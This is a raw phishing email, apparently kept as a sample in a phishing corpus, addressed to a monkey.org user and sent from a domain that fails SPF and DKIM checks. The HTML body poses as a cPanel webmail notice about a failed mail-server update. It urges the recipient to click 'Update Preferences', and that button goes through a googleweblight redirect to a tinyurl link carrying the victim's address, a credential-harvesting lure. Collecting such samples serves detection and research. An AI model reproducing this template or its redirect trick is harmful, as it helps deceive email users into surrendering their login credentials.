@@ -1,0 +1,272 @@
+Return-Path: cpanel@emshooot.com
+Delivered-To: jose@monkey.org
+X-FDA: 82189707516.11.5578268
+Received: from mail.emshooot.com (unknown [51.195.49.220])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 3F7B3120005
+	for <jose@monkey.org>; Mon,  3 Jun 2024 13:48:35 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;	dkim=none ("invalid DKIM
+ record") header.d=emshooot.com header.s=202404 header.b=DFNPQuEr;	spf=fail
+ (imf16.b.hostedemail.com: domain of cpanel@emshooot.com does not designate
+ 51.195.49.220 as permitted sender) smtp.mailfrom=cpanel@emshooot.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1717422515;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=LeCP6UyYvm4FkMwGVE57Elbj3Tt7ezBGtZJpGhtuHiw=;
+	b=fzQ/WrM+sASxv/REZaTjMLW3eMwLiDa5FP7e/LQ6xs3VOlAeG5QMV5minW3RsaLoCY0w1K
+	InLLdM0fc4pZ7yWxiGXbVknoLgzUlW+JcY/DcI5HZsEfKYEntjixft3BAorsAdgtlDixfR
+	DzudnXZDI9aMAg14FRPZg7Yjouh6W7Y=
+ARC-Authentication-Results: i=1;	imf16.b.hostedemail.com;	dkim=none ("invalid
+ DKIM record") header.d=emshooot.com header.s=202404 header.b=DFNPQuEr;
+	spf=fail (imf16.b.hostedemail.com: domain of cpanel@emshooot.com does not
+ designate 51.195.49.220 as permitted sender)
+ smtp.mailfrom=cpanel@emshooot.com;	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1717422515; a=rsa-sha256;
+	cv=none;
+	b=ccsXXnY3qH/tY5bRJWYufVKppJRsmUMlpXJ/Llxf8dBaA+SQ2Lnrm0qBs/Ii83SC3h7x9g
+	Xyu+d1WL7brd3fhzctYyGKhqGdTpIgk07IGMhpuTjBdbAWVdKIvEXLIlbuqtlheeWXg8ui
+	MN2AVbekEo/FdX4+aShuSzRezWnZmlE=
+Received: from ip-129-45.dataclub.info (unknown [84.38.129.45])
+	by mail.emshooot.com (Postfix) with ESMTPA id B9D3B89E18
+	for <jose@monkey.org>; Mon,  3 Jun 2024 13:48:33 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=emshooot.com;
+	s=202404; t=1717422513;
+	bh=b5DosO90x3moJv1QqprEHg5RWUPaA5ctpykc44DyTwI=;
+	h=Reply-To:From:To:Subject:Date:From;
+	b=DFNPQuErNhC3Ey8VEA2b0k5C0gOiiGpLprvexx7SJs8bwmnJJjTuN2IfYRpgCMvlW
+	 kIETMvcoH9KuqZw2QuWAx3azvX9+ZD7Nv9v0lwVe3Y19D+fG1W86U4qG2GIfEFgkVO
+	 v2mDUaKCot+miXpswi+2FWLL1KRtWBjLgMSLbThll36S9suEIIHEQNUOf3yTVvuQio
+	 z16y1vWzCq7tAO95NsURERO36FovIdOL/ea8L69JVcj2jNA9CH3YURAN30RdzMekd8
+	 4A7NCG6iFCDZVLFmSb0rNkHuUOQtn/QBwY2a6CAEyKNXN58DiJl+8Ufmv0Xzz+xIpU
+	 gfKqGLnhERNZg==
+Reply-To: no-reply@monkey.org
+From: cPanel via <cpanel@emshooot.com>
+To: jose@monkey.org
+Subject: WARNING: The user has almost reached their disk quota jose@monkey.org
+Date: 3 Jun 2024 15:48:33 +0200
+Message-ID: <20240603154833.EF42ECB5560A1004@emshooot.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspamd-Queue-Id: 3F7B3120005
+X-Stat-Signature: 9k6f79ddfw5indufyf8yq7tsnrs7huw5
+X-Rspam-User: 
+X-Spam-Status: Yes, score=19.90
+X-HE-Tag: 1717422515-320248
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/HoKeocD2GCzdCa8TRksElqXhhVtxa6MzqKP7JSKG1Y37?=
+ =?utf-8?q?/CwAYw94lGxCQW0V3FNJQJ0jymSEQ8nf9/8gIoovJkZqZaNcB5onAwb4PjJ27LgqW?=
+ =?utf-8?q?1UXNZr761Nu2Q4gMb+nbwarxLYyPUDTRNw+k5fP2GyIwzoZLl1Hf0Ltui0sGm/i7J?=
+ =?utf-8?q?4stUuOn6vJGQINn35S/nvadh8lLJ4tssnRrPhqSN0BLIEqPn2n4Bdt6D8yaDOmh22?=
+ =?utf-8?q?0adA1D46M9wNzVmxopYXskcHIN80nCnqP0KOWJG6ZNggpAEFNPrkiQs2m8toMYu7r?=
+ =?utf-8?q?VY/cQZcaH5rZVJomeE+G9xW2jF4eZ+n//FphaCnqVGtfCSK9FViE3okrgJIWv3oMC?=
+ =?utf-8?q?CaSAjnCVH4mpX16lQIM0eOP568LfvNV7ARso8zPy+3dSRRpVi/i3NkzST0zr44s5A?=
+ =?utf-8?q?h752XLR9xZmcscMcMWO2CGoBMpyPiQSaz5MBXQ71aWZ5ZrgVropuiJwf//EGF9cGs?=
+ =?utf-8?q?sbwtJV1cgxeSpFkjpQLSGLOdVLNxP8Au7t1x8FVFEuVQagFoqDMGl5jFmFX2pEc1s?=
+ =?utf-8?q?NsB4dky1sAwecUXBLWn2cdbWVY46VdjdnOxdGhQQGX+Ihe1Pw9BDIVGnjIFETp1rK?=
+ =?utf-8?q?Wou9HYHPNsUXllNA5lJr2RqEUag6MnSFiOo2FkWsnSKH0Wdn6iJM8yMb8kYvwUEC5?=
+ =?utf-8?q?JA2RV/EUudmQyfyPVSJGlfveYN2jYZknm4uzPBnmnOcHf893LabLN9UapEdjTqfjU?=
+ =?utf-8?q?mXCc4s+ObTZfCOf93SltEZ2HyYMiDH?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 166
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><table width=3D"100%" align=3D"center" style=3D"color: rgb(34, 34, 34=
+); text-transform: none; letter-spacing: normal; font-family: Arial,Helveti=
+ca,sans-serif; font-size: small; font-style: normal; font-weight: 400; word=
+-spacing: 0px; white-space: normal; border-collapse: collapse; orphans: 2; =
+widows: 2;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+  <tbody>
+    <tr>
+      <td style=3D"margin: 0px;">
+        <table width=3D"500" align=3D"center" style=3D"width: 500px; color:=
+ rgb(0, 0, 0); border-collapse: collapse;" border=3D"0" cellspacing=3D"0" c=
+ellpadding=3D"0">
+          <tbody>
+            <tr>
+              <td width=3D"100%" style=3D"margin: 0px; border: 0px currentC=
+olor; border-image: none; padding-top: 5px; padding-bottom: 5px; vertical-a=
+lign: top;">
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody>
+                    <tr>
+                      <td style=3D"margin: 0px; width: 500px; padding-right=
+: 0px; padding-left: 0px;">
+                        <div align=3D"center" style=3D"line-height: 10px;">=
+<img width=3D"225" height=3D"37" src=3D"https://webmail.cocoda.or.tz/cPanel=
+_magic_revision_1677704259/unprotected/cpanel/images/webmail-logo.svg" bord=
+er=3D"0"></div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody>
+                    <tr>
+                      <td style=3D"margin: 0px; width: 500px; text-align: c=
+enter; padding-top: 25px;"><br>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody>
+                    <tr>
+                      <td style=3D"margin: 0px; padding: 35px 10px 10px;">
+                        <div style=3D"font-family: sans-serif;">
+                          <h4 style=3D"line-height: 1.2; font-weight: 500; =
+margin-top: 0px;">Update
+                            Notice</h4>
+                          <div style=3D'color: rgb(85, 85, 85); line-height=
+: 1.2; font-family: Arial,"Helvetica Neue",Helvetica,sans-serif; font-size:=
+ 14px;'>
+                            <p style=3D"margin: 0px;">Oops, we encountered
+                              an error updating the mail server of&nbsp;<a =
+style=3D"color: rgb(17, 85, 204);" href=3D"[_domain]]" target=3D"_blank" re=
+l=3D"noreferrer">monkey.org</a>.
+                              kindly manually update your mailbox
+                              preference settings to prevent your
+                              incoming and outgoing emails to be
+                              restricted.&nbsp;</p>
+                          </div>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody>
+                    <tr>
+                      <td style=3D"margin: 0px; padding: 35px 10px 10px; te=
+xt-align: center;">
+                        <div align=3D"center">
+                          <div style=3D'border: 1px solid rgb(236, 87, 28);=
+ border-image: none; width: auto; color: rgb(255, 255, 255); padding-top: 5=
+px; padding-bottom: 5px; font-family: Arial,"Helvetica Neue",Helvetica,sans=
+-serif; background-color: rgb(236, 87, 28);'>
+<a style=3D"color: rgb(255, 255, 255); padding-right: 20px; padding-left: 2=
+0px; font-size: 16px; background-color: transparent;" href=3D"https://googl=
+eweblight.com/i?u=3Dhttps://tinyurl.com/4tadtncv#jose@monkey.org" target=3D=
+"_blank" rel=3D"noreferrer">Update
+                              Preferences</a></div>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody>
+                    <tr>
+                      <td style=3D"margin: 0px; padding: 35px 10px 10px;">
+                        <div align=3D"center">
+                          <table width=3D"100%" style=3D"border-collapse: c=
+ollapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                            <tbody>
+                              <tr>
+                                <td style=3D"margin: 0px; line-height: 1px;=
+ font-size: 1px; border-top-color: rgb(187, 187, 187); border-top-width: 1p=
+x; border-top-style: solid;">&#8202;</td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"10">
+                  <tbody>
+                    <tr>
+                      <td style=3D"margin: 0px;">
+                        <div style=3D"font-family: sans-serif;">
+                          <div style=3D'color: rgb(85, 85, 85); line-height=
+: 1.2; font-family: Arial,"Helvetica Neue",Helvetica,sans-serif; font-size:=
+ 14px;'>
+                            <p style=3D"margin: 0px;"><span style=3D"font-s=
+ize: 10px;"><em>This email
+                                  and any files transmitted with it are
+                                  confidential and intended solely for
+                                  the use of the individual or entity to
+                                  whom they are addressed. If you have
+                                  received this email in error please
+                                  notify&nbsp;<a style=3D"color: rgb(17, 85=
+, 204);" href=3D"mailto:support@webmail.com" rel=3D"noreferrer">support@web=
+mail.com</a></em></span></p>
+                          </div>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(34, 34, 34); tex=
+t-transform: none; letter-spacing: normal; font-family: Arial,Helvetica,san=
+s-serif; font-size: small; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; border-collapse: collapse; orphans: 2; widows=
+: 2;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+  <tbody>
+    <tr>
+      <td style=3D"margin: 0px;">
+        <table width=3D"500" align=3D"center" style=3D"width: 500px; color:=
+ rgb(0, 0, 0); border-collapse: collapse;" border=3D"0" cellspacing=3D"0" c=
+ellpadding=3D"0">
+          <tbody>
+            <tr>
+              <td width=3D"100%" style=3D"margin: 0px; border: 0px currentC=
+olor; border-image: none; padding-top: 5px; padding-bottom: 5px; vertical-a=
+lign: top;">
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody>
+                    <tr>
+                      <td style=3D"margin: 0px; text-align: center; color: =
+rgb(157, 157, 157); padding-top: 5px; padding-bottom: 5px; font-family: inh=
+erit; font-size: 15px; vertical-align: middle;">
+                        <table width=3D"100%" style=3D"border-collapse: col=
+lapse;" cellspacing=3D"0" cellpadding=3D"0">
+                          <tbody>
+                            <tr>
+                              <td style=3D"margin: 0px; vertical-align: mid=
+dle;"><br>
+                              </td>
+                            </tr>
+                          </tbody>
+                        </table>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<p></p>
+p&gt;
+<p></p>
+
+</body></html>
+
